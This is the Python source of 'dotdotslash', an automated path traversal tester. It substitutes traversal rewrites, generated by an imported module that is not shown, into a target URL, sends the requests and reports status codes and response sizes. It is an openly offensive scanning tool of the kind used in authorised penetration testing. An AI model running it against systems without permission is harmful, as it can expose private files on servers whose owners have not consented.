#!/usr/bin/python3
import argparse
import sys
from http.cookies import SimpleCookie

import requests
from art import *

from match import generate_payloads


class StylesAndColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def colors_codes(code):
    if str(code).startswith("2"):
        colorized = "\033[92m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("3"):
        colorized = "\033[93m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("4"):
        colorized = "\033[91m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("5"):
        colorized = "\033[94m[" + str(code) + "] \033[0m"
        return colorized
    else:
        return code


class MainRequest(object):
    raw = ''
    code = 404

    def query(self, url, cookie=None):
        if cookie:
            rawdata = "Cookie: " + cookie
            cookie = SimpleCookie()
            cookie.load(rawdata)

        req = requests.get(url, cookies=cookie, allow_redirects=False)
        self.raw = req.text
        self.code = req.status_code


def the_loop():
    if str(arguments.string) not in str(arguments.url):
        sys.exit(
            "String: " + StylesAndColors.WARNING + arguments.string + StylesAndColors.ENDC + " not found in url: " +
            StylesAndColors.FAIL + arguments.url + "\n")

    duplicate = []
    results = {}

    rewrites = generate_payloads(arguments.depth)

    for depth in rewrites:
        print("[+] Depth: " + str(depth))
        for rewrite in rewrites[depth]:
            fullrewrite = arguments.url.replace(arguments.string, rewrite)

            if fullrewrite not in duplicate:
                req = MainRequest()
                req.query(fullrewrite)
                if len(req.raw) not in results:
                    results[len(req.raw)] = []
                results[len(req.raw)].append(fullrewrite)
                if len(req.raw) > 0:
                    print(colors_codes(req.code) + fullrewrite)
                    print(" Contents Found: " + str(len(req.raw)))

            duplicate.append(fullrewrite)

    print(results)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='dot dot slash - A automated Path Traversal Tester. Created by @jcesrstef.')
    parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Url to attack.')
    parser.add_argument('--string', '-s', action='store', dest='string', required=True,
                        help='String in --url to attack. Ex: document.pdf')
    parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
    parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default='6',
                        help='How deep we will go?')
    parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
    arguments = parser.parse_args()

    banner = text2art("dotdotslash") + "\n\
    Automated Path Traversal Tester\n\
    version 0.0.9\n\
    Created by Julio Cesar Stefanutto (@jcesarstef)\n\
    \n\
    Starting run in: \033[94m" + arguments.url + "\033[0m\n\
    \
    "
    print(banner)
    the_loop()
